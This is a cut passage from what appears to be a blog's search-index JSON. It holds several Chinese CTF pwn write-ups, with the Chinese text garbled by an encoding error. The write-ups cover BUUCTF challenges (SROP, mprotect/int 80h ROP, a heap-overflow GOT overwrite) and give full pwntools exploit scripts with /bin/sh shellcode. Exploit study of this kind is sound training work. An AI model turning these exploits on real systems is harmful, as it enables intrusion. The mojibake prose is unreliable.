ˆåœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºsig_returnåæ¢å¤çš„ä¸Šä¸‹æ–‡äº†\nsig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # ä½¿ç”¨pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºæˆ‘ä»¬æƒ³è¦çš„ä¸Šä¸‹æ–‡ frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) ç„¶åæŒ‰sig_return+ä¸Šä¸‹æ–‡çš„æ ¼å¼å‘è¿‡å»å°±å¯ä»¥äº†ï¼š\np.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) å®Œæ•´exp from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_s_3\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28554\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) stack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset p.clean() sig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # ä½¿ç”¨pwntoolsçš„è‡ªåŠ¨åŒ–å·¥å…·æ„å»ºæˆ‘ä»¬æƒ³è¦çš„ä¸Šä¸‹æ–‡ frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) i","tags":["pwn","åŸºç¡€SROP","sig_return"],"title":"ã€åŸºç¡€SROPã€‘ã€sig_returnã€‘ciscn_s_3"},{"categories":["writeup"],"contents":"é¢˜ç›®é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ ä¸æ˜¯åŠ¨æ€é“¾æ¥ç¨‹åº\nidaæŸ¥çœ‹ä¼ªä»£ç  è§£æ³•ä¸€ è¯¥é¢˜æ²¡æœ‰systemä¹Ÿæ²¡æœ‰/bin/shï¼Œä¹Ÿä¸èƒ½ret2libcï¼Œä¹Ÿæ²¡æœ‰syscallï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨int 80hæ¥åŸå§‹åœ°è°ƒç”¨0xbå·ç³»ç»Ÿè°ƒç”¨ï¼ˆexecveï¼‰ å› ä¸ºé•¿åº¦é™åˆ¶ä¸º100ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ropperæˆ–ROPgadgetè‡ªåŠ¨ç”Ÿæˆçš„ropchainï¼ˆå¤ªé•¿äº†ï¼‰ï¼Œæ‰€ä»¥éœ€è¦æ‰‹å†™ropchainæ¥æ·»åŠ åˆ©ç”¨ç‡æ›´é«˜çš„gadget\n#!/usr/bin/python2 #coding=utf-8 from pwn import * from LibcSearcher import * context(os = \u0026#34;linux\u0026#34;, arch = \u0026#34;i386\u0026#34;, log_level= \u0026#34;debug\u0026#34;) p = remote(\u0026#34;node3.buuoj.cn\u0026#34;, 28443) read_addr = 0x0806cd50 int_80 = 0x080493e1 pop_eax_ret = 0x080bae06 pop_edx_ecx_eax_ret = 0x0806e850 bss_addr = 0x080eb584 payload = \u0026#34;a\u0026#34; * 0x20 + p32(read_addr) payload += p32(pop_edx_ecx_eax_ret)\t# å¹³è¡¡æ ˆç©ºé—´ payload += p32(0) + p32(bss_addr) + p32(8)\t# readå‡½æ•°çš„ä¸‰ä¸ªå‚æ•° payload += p32(pop_eax_ret) + p32(0x0b)\t# å¯¹eaxè¿›è¡Œèµ‹å€¼ # å¯¹edxã€ecxã€ebxè¿›è¡Œèµ‹å€¼ payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr) payload += p32(int_80) p.sendlineafter(\u0026#34;:\u0026#34;, payload) p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.sendline(\u0026#34;cat flag\u0026#34;) p.interactive() è§£æ³•äºŒ è°ƒç”¨mprotectå‡½æ•°è®¾ç½®ä¸€æ®µå†…å­˜çš„å¯æ‰§è¡Œæƒé™ï¼Œç„¶åå†™å…¥shellcode éœ€è¦æ³¨æ„çš„æ˜¯mprotectå‚æ•°ä¸­å†…å­˜çš„èµ·å§‹åœ°å€éœ€è¦æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ï¼Œä¹Ÿå°±æ˜¯è¯´æœ«ä¸‰ä½éœ€è¦æ˜¯0\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./simplerop\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25133\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x80EAF85 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 8 pop_edx_ecx_ebx_ret = 0x0806e850 bss = 0x80EB000 ret = 0x080481b2 payload = flat({offset:[ m_elf.sym[\u0026#39;mprotect\u0026#39;], pop_edx_ecx_ebx_ret, bss, 0x1000, 0b111, m_elf.sym[\u0026#39;read\u0026#39;], pop_edx_ecx_ebx_ret, 0, bss, 0x100, bss ]}) sendline_after_clean(payload) # sleep(0.1) shellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sendline_after_clean(flat(shellcode_32)) # sleep(0.1) # payload = flat({offset:bss}) # sendline_after_clean(payload) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/","section":"writeup","summary":"é¢˜ç›®é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ ä¸æ˜¯åŠ¨æ€é“¾æ¥ç¨‹åº idaæŸ¥çœ‹ä¼ªä»£ç  è§£æ³•ä¸€ è¯¥é¢˜æ²¡æœ‰systemä¹Ÿæ²¡æœ‰/bin/shï¼Œä¹Ÿä¸èƒ½ret2libcï¼Œä¹Ÿæ²¡æœ‰syscallï¼Œä½†æ˜¯","tags":["pwn","åˆ©ç”¨mprotectå‡½æ•°","åˆ©ç”¨int 80h"],"title":"ã€åˆ©ç”¨int 80hã€‘ã€åˆ©ç”¨mprotectå‡½æ•°ã€‘BUUCTF cmcc_simplerop"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\næŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å¯ä»¥çœ‹åˆ°æ˜¯æ ‡å‡†çš„èœå•å †é¢˜\nallocate è¿™é‡Œè‡ªå®šä¹‰äº†ç»“æ„ä½“ åœ¨endså¤„æŒ‰dæ–°å»ºåŸŸï¼Œå…‰æ ‡åœ¨å…·ä½“çš„åŸŸä¸ŠæŒ‰dä¼šæ¸…ç©º è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ç”³è¯·äº†ä¸¤ç‰‡å†…å­˜ï¼š\nç»“æ„ä½“å›ºæœ‰çš„0x80å­—èŠ‚çš„å†…å­˜ï¼Œç¬¬ä¸€ä¸ªåŸŸæ˜¯å­˜æ”¾ç¬¬äºŒç‰‡å†…å­˜çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªåŸŸç”¨äºå­˜æ”¾ä¸€ä¸ªname ç¬¬äºŒç‰‡å†…å­˜çš„å¤§å°æ˜¯ä»»æ„çš„ï¼Œä½†æ˜¯è¿™é‡Œå®ƒé™åˆ¶ptr_content + input_sizeçš„å€¼ä¸èƒ½å¤§äºç¬¬ä¸€ä¸ªåŸŸçš„å†…å­˜åœ°å€ å› ä¸ºptr_contentçš„å†…å­˜å…ˆç”³è¯·ï¼Œnameçš„å†…å­˜åç”³è¯·ï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰freeçš„æƒ…å†µä¸‹ï¼Œptr_contentçš„å†…å­˜åœ°å€æ€»æ˜¯å°äºnameçš„å¹¶ä¸”ç´§å¯†ç›¸è¿çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ£€æµ‹æ€»æ˜¯èƒ½å¤Ÿä¿è¯ä¸æº¢å‡ºçš„ è¿™é‡Œæ˜æ˜¾æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†ä¸¤å—å†…å­˜freeåˆ°unsorted binä¸­ï¼Œå†ç”³è¯·ä¸€å—å¤§å°ç­‰äºä¸¤å—å†…å­˜å¤§å°ä¹‹å’Œçš„å†…å­˜ä½œä¸ºptr_contentçš„åœ°å€ï¼Œè¿™æ ·nameç”³è¯·çš„å†…å­˜åœ°å€å°±ä¼šä»top_chunkä¸­åˆ‡å‡ºï¼Œä¸¤è€…ä¸­é—´çš„ä¸€ä¸²chunkå°±éƒ½å¯ä»¥æº¢å‡ºäº† remove ç”¨ä¸äº†UAFï¼Œä¹Ÿä¸èƒ½é€šè¿‡freeåˆ°unsorted binä¸­è·å–libc\nshow å¯ä»¥å°†ptr_contentçš„å€¼æ”¹ä¸ºfreeçš„gotå€¼ï¼Œç„¶åå°±èƒ½è·å¾—freeçš„åœ°å€äº†\nchange åªæ›´æ–°ptr_contenté‡Œçš„å€¼\nexp é€šè¿‡æº¢å‡ºæ”¹å˜ptr_contentçš„å€¼ä¸ºfree_gotï¼Œç„¶åshowå‡ºfreeçš„åœ°å€ï¼Œè®¡ç®—å¾—åˆ°systemåœ°å€ï¼Œæ”¹å˜free_gotå€¼ä¸ºsystemåœ°å€å³å¯\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./babyfengshui_33c3_2016\u0026#34; libc_name: str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;27439\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(size: int, name: bytes, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;0\u0026#34;) sendline_after_clean(str(size)) sendline_after_clean(name) sendline_after_clean(str(len(content))) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;) sendline_after_clean(str(index)) def show(index: int) -\u0026gt; bytes: sendline_after_clean(b\u0026#34;2\u0026#34;) sendline_after_clean(str(index)) p.recvuntil(b\u0026#34;name: \u0026#34;) received = {} received[\u0026#39;name\u0026#39;] = p.recvline() p.recvuntil(b\u0026#34;description: \u0026#34;) received[\u0026#39;description\u0026#39;] = p.recv(4) print(received) return received def change(index: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;3\u0026#34;) sendline_after_clean(str(index)) sendline_after_clean(str(len(content))) sendline_after_clean(content) allocate(0x80, \u0026#34;1\u0026#34;, \u0026#34;0\u0026#34;) # 0 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 1 allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 2 remove(0) # gdb.attach(p) # input() allocate(0x100, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 3 # allocate(0x80, \u0026#34;/bin/sh\\x00\u0026#34;, \u0026#34;/bin/sh\\x00\u0026#34;)# 4 # gdb.attach(p) payload = flat([ b\u0026#34;a\u0026#34;*0x108, 0, 0x89, b\u0026#34;a\u0026#34;*0x80, 0, 0x89, m_elf.got[\u0026#39;free\u0026#39;] ]) change(3, payload) # gdb.attach(p) free_addr = ug(show(1)[\u0026#39;description\u0026#39;].ljust(4, b\u0026#34;\\x00\u0026#34;)) libc_base = free_addr - libc.sym[\u0026#39;free\u0026#39;] system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] suclog( free_addr=free_addr, libc_base=libc_base, system_addr=system_addr ) payload = flat(system_addr) change(1, payload) remove(2) interactive_after_clean() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%BB%95%E8%BF%87%E5%A0%86%E6%BA%A2%E5%87%BA%E9%99%90%E5%88%B6buuctf-babyfengshui_33c3_2016/","section":"writeup","summary":"åŸé¢˜é“¾æ¥ æŸ¥çœ‹ç¨‹åºæ¶æ„ idaä¼ªä»£ç  å¯ä»¥çœ‹åˆ°æ˜¯æ ‡å‡†çš„èœå•å †é¢˜ allocate è¿™é‡Œè‡ªå®šä¹‰äº†ç»“æ„ä½“ åœ¨endså¤„æŒ‰dæ–°å»ºåŸŸï¼Œå…‰æ ‡åœ¨å…·ä½“çš„åŸŸä¸ŠæŒ‰dä¼šæ¸…ç©º è¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ç”³","tags":["pwn","ç»•è¿‡å †æº¢å‡ºé™åˆ¶"],"title":"ã€ç»•è¿‡å †æº¢å‡ºé™åˆ¶ã€‘BUUCTF babyfengshui_33c3_2016"},{"categories":["writeup"],"contents":"åŸé¢˜é“¾æ¥\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./orw\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;26851\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x804858A c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: if not isinstance(until, bytes): until = bytes(until, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(until) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) p.send(content) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if not isinstance(content, bytes): content = bytes(content, encoding=\u0026#34;UTF-8\u0026#34;) send_after_clean(content + p.newline, until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: if isinstance(prev_string, str): prev_string = bytes(prev_string, encoding=\u0026#34;UTF-8\u0026#34;) p.recvuntil(prev_string) if bound is not None and isinstance(bound, str): bound = bytes(bound, encoding=\u0026#34;UTF-8\u0026#34;) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = 